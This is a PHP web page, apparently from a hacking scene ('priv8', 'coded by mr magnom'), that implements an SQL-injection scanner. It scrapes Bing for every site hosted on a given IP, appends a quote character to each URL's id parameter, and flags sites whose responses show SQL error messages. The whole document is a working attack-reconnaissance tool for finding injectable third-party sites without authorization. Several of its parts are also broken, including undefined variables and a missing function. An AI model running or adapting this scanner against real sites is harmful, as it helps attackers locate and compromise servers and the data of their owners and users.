<title>Bing Grabber from Ip | GSH COdEr</title>
<center><br><br><br><br><br><br>
<hr width="40%" height="10%" color="black">
<p><font size="10" color="white" style="text-shadow: 5px 5px 20px red;">SQLi Scanner From Ip priv8</font></p>

<form method="post">
<center>
<br/><input type="text" name="site" size="42" />
<br><input type="submit" name="go" value="Dont kill me i have a cat" />
<hr width="40%" height="10%" color="black">
</center>

</form><style type='text/css' media='screen'>
    body{ 

        background-color: #000000;
        background-content:HPH;
        background-attachment:fixed;
        background-position:bottom; 
	
}
hr {
 border:0;
 height:1px;
 background-image:linear-gradient(to right,rgba(0,0,0,0),rgb(255, 0, 0),rgba(0,0,0,0))
 }



</style>
<style type="text/css">
textarea {
    width: 500px;
    height: 200px;
    border: 1px solid #000000;
    margin: 5px auto;
    padding: 7px;
}
input[type=submit] {
    width: 500px;
    height: 25px;
    border: 1px solid #000000;
    background: transparent;
    margin: 5px auto;
    background: red;
    color: #ffffff;
    cursor: pointer;
}
</style>

<?php
//<>

// functions

// coded by mr magnom


function getsource($url, $proxy) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    if ($proxy) {
        $proxy = explode(':', autoprox());
        curl_setopt($curl, CURLOPT_PROXY, $proxy[0]);
        curl_setopt($curl, CURLOPT_PROXYPORT, $proxy[1]);
    }
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}

/////////////
error_reporting(0);
set_time_limit(0);
$ip=$_POST['site'];
     if($_POST["go"]) {

        $npage = 1;
        $npages = 300;
        $allLinks = array();
        $lll = array();
        while($npage <= $npages) {
            $x = getsource("http://www.bing.com/search?q=ip%3A" . $ip . "+id%3D&first=" . $npage, $proxy);
            if ($x) {
                preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
                foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
                $npage = $npage + 10;
                if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
            } else break;
        }
        //print_r($allLinks) ;
        $col=array_filter($allLinks);
        $lol=array_unique($col);

        foreach ($lol as $urll){
         //echo'<b><font color="06FD02"><a href='.$urll.'>'.$urll.'</a></font></b><br>';
         sqli($urll);
        }


    }
    function sqli($url){
      $url2=("$url%27");
      $xx=http_get($url2);
      if(preg_match("/SQL syntax/i",$x) or eregi('You have an error',$xx) or eregi(' in your SQL syntax',$x)or preg_match('/sql/i',$x)){
       echo'<b><font color="green">'.$url2.'</font></b><br>';
      }else{
       echo'<b><font color="red">'.$url2.'</font></b><br>';
      }
    }
    function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
    }


?>
